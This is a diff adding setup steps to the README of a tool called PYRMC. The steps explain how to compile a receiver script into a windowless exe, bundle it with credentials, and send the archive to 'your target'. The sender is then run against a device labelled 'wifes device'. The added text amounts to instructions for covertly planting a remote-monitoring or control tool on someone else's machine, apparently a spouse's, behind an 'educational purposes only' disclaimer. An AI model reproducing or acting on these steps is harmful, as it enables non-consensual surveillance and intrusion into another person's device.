@@ -83,7 +83,30 @@ twitch_client = twitch.TwitchClient(client_id='')
         # Replace 'your_stream_key' with your actual Twitch stream key
         stream_key = ''
 ```
-(lines
+(lines 208-209)
+```python
+        # Get the stream URL
+        stream_url = f''
+```
+
+### Step 3
+
+After editing the values use pyinstaller to build your reciever.py into an exe
+```bash
+pyinstaller --noconfirm --onefile --noconsole  "path_to_reciever.py"
+```
+After building the exe file, copy it to your folder and zip `storage` and `reciever.exe`.
+You can now send the zip archive to your target
+
+## Sender.py
+To use sender.py and target the reciever you just built, create a storage folder where your sender.py is located, in this case it's `wifes device`
+put the same `cred.json` inside the storage folder
+after doing those steps, you can run the file
+```bash
+python sender.py
+```
+> [!WARNING]  
+> As the owner of PYRMC, I am not responsible of what you use the script or app for. Please use this tool for educational purposes only!
 
 ## Download
 
